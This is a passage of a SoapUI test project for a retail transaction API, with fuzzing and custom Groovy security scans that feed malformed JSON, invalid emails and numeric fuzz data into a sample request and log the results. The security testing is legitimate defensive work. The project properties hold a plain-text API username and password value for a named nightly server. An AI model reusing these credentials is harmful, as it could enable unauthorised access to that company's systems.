//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="id" parameterName="id" xpath="" checked="true"/>
              <con:parameters label="type" parameterName="type" xpath="" checked="true"/>
              <con:parameters label="tenders" parameterName="tenders" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="7604a84e-ea69-408e-b38d-0452a7789049" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:minimal>5</con:minimal>
              <con:maximal>10</con:maximal>
              <con:numberOfRequest>20</con:numberOfRequest>
            </con:config>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="id" parameterName="id" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ALL_AT_ONCE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
        </con:testStepSecurityTest>
        <con:properties/>
      </con:securityTest>
    </con:testCase>
    <con:testCase id="4b6ffd8a-5a14-4c2f-bebc-14a57179d6d2" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="addTransactionAPI" searchProperties="true">
      <con:settings/>
      <con:testStep type="restrequest" name="addTransactionV1" id="1aa23cc2-3717-48db-99e6-e79cbe44755c">
        <con:settings/>
        <con:config service="addRegularTransaction" resourcePath="/v1.1/transaction/add" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="addTransactionV1" id="30d7b033-bada-4cf6-abdf-781b858869dc" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Content-Type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
            <con:request>{
	"root": {
		"transaction": {
			"bill_client_id": "1121888",
			"type": "regular",
			"number": "BILL_${=org.apache.commons.lang.RandomStringUtils.randomNumeric(5)}",
			"notes": "2 lin1e items",
			"amount" : "50000",
			"gross_amount": "100",
			"discount": "10",
			"customer": {
				"mobile": "6935391507jnejc",
				"email": "6935391507wcece@gmail.com@#",
				"external_id": "x6935391507",
				"firstname": "Nayan",
				"lastname": "Gaur"
			},
			"extended_fields": {
				"field": [{
						"name": "ship_first_name",
						"value": "Nayan"
					},
					{
						"name": "ship_last_name",
						"value": "Gaur"
					}
				]
			},
			"payment_details": {
				"payment": [{
						"mode": "CASH",
						"value": "100"
					},
					{
						"mode": [
							"CREDIT",
							"CHECKAPI"
						],
						"value": [
							"4000",
							"500"
						],
						"attributes": {
							"attribute": [{
									"name": "BankNameAPI",
									"value": "value_602656"
								},
								{
									"name": "branch_nameAPI",
									"value": "value_602656"
								}
							]
						},
						"notes": "notes_602656"
					}
				]
			},
			"custom_fields": {

				"field": [{
						"name": "bankdetails",
						"value": "SBI"
					},
					{
						"name": "bankdetails",
						"value": "SBI"
					}
				]

			},
			"line_items": {
				"line_item": [{
						"extended_fields": {
							"field": [{
									"name": "MetalRate",
									"value": 23
								},
								{
									"name": "service_tax_amount",
									"value": 100
								}
							]
						},
						"serial": "1",
						"amount": "500",
						"description": "soap",
						"item_code": "item-001",
						"qty": "50",
						"rate": "10",
						"value": "500",
						"attributes": {
							"attribute": {
								"name": "brand",
								"value": "Levis"
							}
						}
					},
					{
						"extended_fields": {
							"field": [{
									"name": "DesignCode",
									"value": "jmh6677"
								},
								{
									"name": "SupplierCode",
									"value": "hgjy111"
								}
							]
						},
						"serial": "2",
						"amount": "500",
						"description": "soap",
						"item_code": "item-001",
						"qty": "50",
						"rate": "10",
						"value": "500",
						"transaction_number": "niBill1",
						"attributes": {
							"attribute": {
								"name": "brand",
								"value": "Levis"
							}
						}
					},
					{
						"extended_fields": {
							"field": [{
									"name": "StoneCharge",
									"value": 22
								},
								{
									"name": "MakingCharge",
									"value": 11
								}
							]
						},
						"serial": "3",
						"item_code": "t122",
						"description": "afvdfvd",
						"qty": "3",
						"rate": "1000",
						"value": "3000",
						"discount_value": "100",
						"amount": "2900",
						"cashier_id": "cash1233",
						"type": "return",
						"return_type": "LINE_ITEM",
						"transaction_number": "previousBill1"
					}
				]
			},
			"associate_details": {
				"code": "hiraxdhara",
				"name": "Tom Sawyer"
			}
		}
	}
}</con:request>
            <con:originalUri>https://nightly.capillary.in/v1.1/transaction/add</con:originalUri>
            <con:assertion type="Simple Contains" id="abe19af7-8177-41de-b11d-89b2ab117673" name="Contains">
              <con:configuration>
                <token>"success":"true"</token>
                <ignoreCase>false</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:username>${#Project#auth_username}</con:username>
              <con:password>${#Project#auth_password}</con:password>
              <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
              <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
              <con:authType>Global HTTP Settings</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters/>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties/>
      <con:securityTest id="79ea0997-dab2-47ef-9cd8-7dd6febbdf76" name="addTransactionFuzzyTests" failOnError="false" failSecurityTestOnScanErrors="true">
        <con:settings/>
        <con:setupScript>import com.eviware.soapui.model.testsuite.TestStepResult.TestStepStatus;

def newJson = []

context.newJson = newJson;
def testSuiteName = context.testCase.testSuite.getLabel();
def testCaseName = context.testCase.getLabel();
def reportPortalTestSuites = context.testCase.testSuite.project.testSuites['ReportPortal'];

String project_dir = context.expand('${projectDir}');
fuzzDBLocation = project_dir + File.separator + "test_data" + File.separator + "fuzzdb";

//Get data from JSON Fuzzing.
def lstOfJsons = []
def lstOfInvalidEmails = []
def lstOfInvalidMobiles = []
def lstOfFuzzString = []
def lstOfInvalidTypes = []

log.info("Reading JSON_fuzzing......")

new File(fuzzDBLocation + File.separator + "JSON_fuzzing.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfJsons.add(line)
    }
}
log.info("Reading invalid-emails.......")

new File(fuzzDBLocation + File.separator + "invalid-email-addresses.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfInvalidEmails.add(line)
    }
}
log.info("Reading the numeric fuzz data.....")
new File(fuzzDBLocation + File.separator + "numeric.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfInvalidMobiles.add(line)
    }
}

log.info("Reading the fuzz strings data.....")
new File(fuzzDBLocation + File.separator + "fuzzString.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfFuzzString.add(line)
    }
}
log.info("Reading the Invalid types text file.....")
new File(fuzzDBLocation + File.separator + "invalidTypes.txt").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) {
        lstOfInvalidTypes.add(line)
    }
}



//set to context.
context.lstOfJsons = lstOfJsons
context.lstOfInvalidEmails = lstOfInvalidEmails
context.lstOfInvalidMobiles = lstOfInvalidMobiles
context.lstOfFuzzString = lstOfFuzzString
context.lstOfInvalidTypes = lstOfInvalidTypes
log.info("Context set!")

/*
//Start a launch.
def startLaunchTestCase = reportPortalTestSuites.testCases['StartLaunch']
startLaunchTestCase.setPropertyValue("launchName", "APIFuzzyTEsts");
def startLaunchRunner = startLaunchTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def stepResults = startLaunchRunner.getResults();
log.info("Lauch Created - " + stepResults[1].getStatus());

//Start a TestSuite.
def startTestSuiteTestCase = reportPortalTestSuites.testCases['StartTestSuite']
startTestSuiteTestCase.setPropertyValue("suiteName", testSuiteName)
def startTestSuiteRunner = startTestSuiteTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def ts_stepResults = startTestSuiteRunner.getResults();
log.info("TestSuite Created - " + ts_stepResults[1].getStatus());

//Start a TestCase.
def startTestCaseTestCase = reportPortalTestSuites.testCases['StartTestCase']
startTestCaseTestCase.setPropertyValue("caseName", testCaseName);
def startTestCaseRunner = startTestCaseTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def tc_stepResults = startTestCaseRunner.getResults();
log.info("TestCase Created - " + tc_stepResults[1].getStatus());

log.info("LaunchID = " + reportPortalTestSuites.getPropertyValue('launchId'));
log.info("SuiteID = " + reportPortalTestSuites.getPropertyValue('suiteId'));
log.info("CaseId = " + reportPortalTestSuites.getPropertyValue('caseId'));
*/</con:setupScript>
        <con:tearDownScript>import groovy.json.JsonOutput;
import com.eviware.soapui.security.*;

String project_dir = context.expand('${projectDir}');
log.info("test name = " + context.testCase.getSecurityTestAt(0).getName())
def result = context.getProperty('SecurityScanRequestResult')

log.info ("Result Type: " + result.getResultType())

log.info("status: " + result.getStatus())

log.info("Messages: " + result.getMessages())

log.info("Actions: "+ result.getActions())

def newJsonStr = JsonOutput.toJson(context.newJson)
def newPrettyJson = JsonOutput.prettyPrint(newJsonStr)

String outputFolder = context.testCase.testSuite.project.getPropertyValue("outputFolder");
String reportFileName = context.testCase.getSecurityTestAt(0).getName();
File reportFileObj = new File(outputFolder + File.separator + reportFileName + ".json");

saveToFile(reportFileObj, newPrettyJson)

//Save the contents to a file
def saveToFile(file, content) {
    if (!file.parentFile.exists()) {
         file.parentFile.mkdirs()
         log.info "Directory did not exist, created"
    }
    file.write(content)
    assert file.exists(), "${file.name} not created"
}

/*
// closing the testcase and suite over reportportal.
def reportPortalTestSuites = context.testCase.testSuite.project.testSuites['ReportPortal'];

def closeTestCase = reportPortalTestSuites.testCases['closeTestCase']
closeTestCase.setPropertyValue("status", "passed");
def closeTestCaseRunner = closeTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeTestCaseResults = closeTestCaseRunner.getResults();
log.info("TestCase closed - " + closeTestCaseResults[1].getStatus());

def closeTestSuite = reportPortalTestSuites.testCases['closeTestSuite']
closeTestSuite.setPropertyValue("status", "passed");
def closeTestSuiteRunner = closeTestSuite.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeTestSuiteRunnerResults = closeTestSuiteRunner.getResults();
log.info("TestSuite closed - " + closeTestSuiteRunnerResults[1].getStatus());

def closeLaunch = reportPortalTestSuites.testCases['closeLaunch']
def closeLaunchRunner = closeLaunch.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeLaunchRunnerResults = closeLaunchRunner.getResults();
log.info("Launch Closed - " + closeLaunchRunnerResults[1].getStatus());
*/</con:tearDownScript>
        <con:testStepSecurityTest>
          <con:testStepId>1aa23cc2-3717-48db-99e6-e79cbe44755c</con:testStepId>
          <con:testStepSecurityScan type="GroovySecurityScan" name="Custom Script" id="71b4854e-9edc-406b-bb89-04e59a0608b3" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:GroovySecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:executeScript>import groovy.json.JsonSlurper;
import groovy.json.JsonBuilder;

def req = testStep.getPropertyValue("Request")

def requestJson = new JsonSlurper().parseText(req);

int jsonFuzzMaxIndex = context.lstOfJsons.size -1;
int fuzzStringMaxIndex = context.lstOfFuzzString.size -1;
int invalidTypesMaxIndex = context.lstOfInvalidTypes.size -1;
int numericFuzzMaxIndex = context.lstOfInvalidMobiles.size -1;
if(context.jsonFuzzIndex == null){
	context.jsonFuzzIndex = 0
}
if(context.fuzzStringIndex == null){
	context.fuzzStringIndex = 0;
}
if(context.invalidTypesIndex == null){
	context.invalidTypesIndex = 0;
}
if(context.numericFuzzIndex == null){
	context.numericFuzzIndex = 0;
}

JsonBuilder builder = new JsonBuilder(requestJson)

// modify the request body with fuzzy json data.
if(context.jsonFuzzIndex &lt;= jsonFuzzMaxIndex){
	log.info("Content at index - " + context.jsonFuzzIndex + "==> " + context.lstOfJsons.get(context.jsonFuzzIndex))
	builder.content = context.lstOfJsons.get(context.jsonFuzzIndex)
	parameters.payload = builder.toString();
	log.info("Payload set -- " + parameters.payload)
	context.changedParamsField = "jsonBody"
	context.changedParamsValue =  context.lstOfJsons.get(context.jsonFuzzIndex)
  context.status = securityScan.getSecurityScanResult().getStatusString()
	context.jsonFuzzIndex++
	return true
}
//modify the "type" field in request body with fuzzyString.
if(context.fuzzStringIndex &lt;= fuzzStringMaxIndex){
	log.info("Content at index - " + context.fuzzStringIndex + "==> " + context.lstOfFuzzString.get(context.fuzzStringIndex))
	builder.content.root.transaction.type = context.lstOfFuzzString.get(context.fuzzStringIndex)
	parameters.payload = builder.toString();
	log.info("Payload set -- " + parameters.payload)
	context.changedParamsField = "transaction.type"
	context.changedParamsValue =  context.lstOfFuzzString.get(context.fuzzStringIndex)
  context.status = securityScan.getSecurityScanResult().getStatusString()
	context.fuzzStringIndex++
	return true
}
//modify the "number" field in request body with invalid types.
if(context.invalidTypesIndex &lt;= invalidTypesMaxIndex){
	log.info("Content at index - " + context.invalidTypesIndex + "==> " + context.lstOfInvalidTypes.get(context.invalidTypesIndex))
	builder.content.root.transaction.number = context.lstOfInvalidTypes.get(context.invalidTypesIndex)
	parameters.payload = builder.toString();
	log.info("Payload set -- " + parameters.payload)
	context.changedParamsField = "transaction.number"
	context.changedParamsValue =  context.lstOfInvalidTypes.get(context.invalidTypesIndex)
  context.status = securityScan.getSecurityScanResult().getStatusString()
	context.invalidTypesIndex++
	return true
}
//modify the "amount", "gross_amount" and "discount" field in request body with numeric fuzz data.
if(context.numericFuzzIndex &lt;= numericFuzzMaxIndex){
	log.info("Content at index - " + context.numericFuzzIndex + "==> " + context.lstOfInvalidMobiles.get(context.numericFuzzIndex))
	builder.content.root.transaction.amount = context.lstOfInvalidMobiles.get(context.numericFuzzIndex)
	builder.content.root.transaction.gross_amount = context.lstOfInvalidMobiles.get(context.numericFuzzIndex)
	builder.content.root.transaction.discount = context.lstOfInvalidMobiles.get(context.numericFuzzIndex)
	parameters.payload = builder.toString();
	log.info("Payload set -- " + parameters.payload)
	context.changedParamsField = "transaction.amount,transaction.gross_amount,transaction.discount"
	context.changedParamsValue =  context.lstOfInvalidMobiles.get(context.numericFuzzIndex)
  context.status = securityScan.getSecurityScanResult().getStatusString()
	context.numericFuzzIndex++
	return true
}
else{
	return false
}</con:executeScript>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="4e85253c-9692-4a3e-ad66-4b08d2903040" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="380924fd-3e90-4150-b361-599475f71171" name="Transaction not successfull">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);

status = messageExchange.getResponseHeaders().get('#status#')
code = (status =~ "[1-5]\\d\\d")[0]


if(code == "200"){
	def success = json.response.transactions.transaction[0].item_status.success;
	def message = json.response.transactions.transaction[0].item_status.message;
	
	assert(success != "true")
	if(message.contains("Duplicate transaction number")){
		assert false: "Transaction is duplicate but added successfully";
	}
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="adbe29ff-1f5e-43d5-9714-e371ffccf80f" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()

HashMap&lt;String,String> properties = messageExchange.getProperties()
def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString, "changedFieldKey": context.changedParamsField, "changedFieldValue": context.changedParamsValue]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString, "changedFieldKey": context.changedParamsField, "changedFieldValue": context.changedParamsValue]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="payload" parameterName="Request" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
        </con:testStepSecurityTest>
        <con:properties/>
      </con:securityTest>
    </con:testCase>
    <con:properties/>
  </con:testSuite>
  <con:properties>
    <con:property>
      <con:name>environment</con:name>
      <con:value>nightly</con:value>
    </con:property>
    <con:property>
      <con:name>execution_group</con:name>
      <con:value>sanity,regression</con:value>
    </con:property>
    <con:property>
      <con:name>auth_username</con:name>
      <con:value>api.auto1</con:value>
    </con:property>
    <con:property>
      <con:name>auth_password</con:name>
      <con:value>202cb962ac59075b964b07152d234b70</con:value>
    </con:property>
    <con:property>
      <con:name>application_endpoint</con:name>
      <con:value>crm-nightly-new.cc.capillarytech.com</con:value>
    </con:property>
    <con:property>
      <con:name>outputFolder</con:name>
      <con:value>/Users/nayan.gaur/Documents/bitbucket_repo/endtoendtests/platform_loyalty_endtoend_tests/target/surefire-reports</con:value>
    </con:property>
  </con:properties>
  <con:wssContainer/>
  <con:oAuth2ProfileContainer/>
  <con:oAuth1ProfileContainer/>
  <con:beforeRunScript>import groovy.json.JsonSlurper
import java.io.FileInputStream;

////////////////////// Functions /////////////////////////

def filterList(commaSperatedListContent){
	def list = commaSperatedListContent.split(",");
	def filteredList = [];
	list.each(){
	def entry = it.toLowerCase().replaceAll("^\\s+", "");
	entry = entry.trim();
	if(entry != ""){
	filteredList.add(entry);}
	}
	return filteredList;
}

def customListCompare(list1,list2){
	//list1 is the list of tags that are given by user to execute.
	//list2 is the list of tags for specific test suite.
	boolean isRunnable = false;
	for(int l1 in 0 .. list1.size()-1)
	{
		def inputTag = list1.get(l1);
		for(int l2 in 0 .. list2.size()-1){

			if(inputTag.toString() == list2.get(l2).toString()){
				isRunnable =  true;
				break;
			}
		}
		if(isRunnable){
			break;
		}
	}
	return isRunnable;
}
///////////////////// Function //////////////////////////////////////////////


// connect to json data file based on environment specified.
String environment = context.expand('${#Project#environment}');

String project_dir = context.expand('${projectDir}');
String filepath = project_dir + File.separator + "test_data" + File.separator + project.name + File.separator + environment + ".json";
log.info environment
try{
//File data_file = new File(filepath);
def reader = new BufferedReader(new InputStreamReader(new FileInputStream(filepath),"UTF-8"))
def json = new JsonSlurper().parse(reader);
String endpoint = json.endpoint;
String auth_username = json.authorization.username;
String auth_password = json.authorization.password;
project.setPropertyValue("auth_username",auth_username);
project.setPropertyValue("auth_password",auth_password);
project.setPropertyValue("alphatill_username",json.authorization.alphatill_username);
project.setPropertyValue("alphatill_password",json.authorization.alphatill_password);
project.setPropertyValue("gammatill_username",json.authorization.gammatill_username);
project.setPropertyValue("gammatill_password",json.authorization.gammatill_password);
project.setPropertyValue("application_endpoint",endpoint);
project.setPropertyValue("webhook_workspace",json.webhook_workspace);
project.setPropertyValue("webhook_workspace_name",json.webhook_workspace_name);
project.setPropertyValue("custom_events_webhook",json.custom_events_webhook);
}
catch(Exception e){
	log.info("Could not find the data file " + filepath + " Please check the data file. error == " + e.getMessage());
	assert(false)
}


// Selecting the test suites to run based on the group.

String executionGroups = project.getPropertyValue("execution_group")
def filteredTags = filterList(executionGroups) ;

def Conf_input = "";

log.info "Reading the Configuration file.....";

try{

Conf_input = new File(project_dir + "/test_data/" + project.getName() + "/TestData.xml");

def parser = new XmlParser(); //Get XML Parser.

def Configuration = parser.parse(Conf_input);//Point parser to configration file.

context.Configuration = Configuration;

}
catch(Exception e){
		assert false : "Error in reading configuration file -- " + e.getMessage();
}

def testSuiteListToExecute = [];

log.info "Fetching Test-Scenarios to execute....";

def testSuites = project.getTestSuiteList();

//Enable all TestSuites.
for(j in 0 .. testSuites.size()-1){
	//log.info testSuites.get(j).getName();
	testSuites.get(j).setDisabled(false);
}
//Decide which test suites to execute and eventually disabled the non-relevant test suites.
		for(i in 0 .. testSuites.size()-1) {
   			def testSuiteName = testSuites.get(i).getName();
   			def tags = context.Configuration.TestSuite."${testSuiteName}".tags.text()
   			def testSuiteTags = filterList(tags);

   			if(filteredTags == null || filteredTags.empty){
   				break;
   			}
   			else{
   				if(testSuiteTags == null || testSuiteTags.empty){
   					testSuites.get(i).setDisabled(true);
   				}
   				else{
   					def isRunnable = customListCompare(filteredTags,testSuiteTags);
   					log.info testSuiteName+":::"+isRunnable
   					if(!isRunnable){
   						testSuites.get(i).setDisabled(true);
   					}
   				}
   			}

		}</con:beforeRunScript>
  <con:sensitiveInformation/>
</con:soapui-project>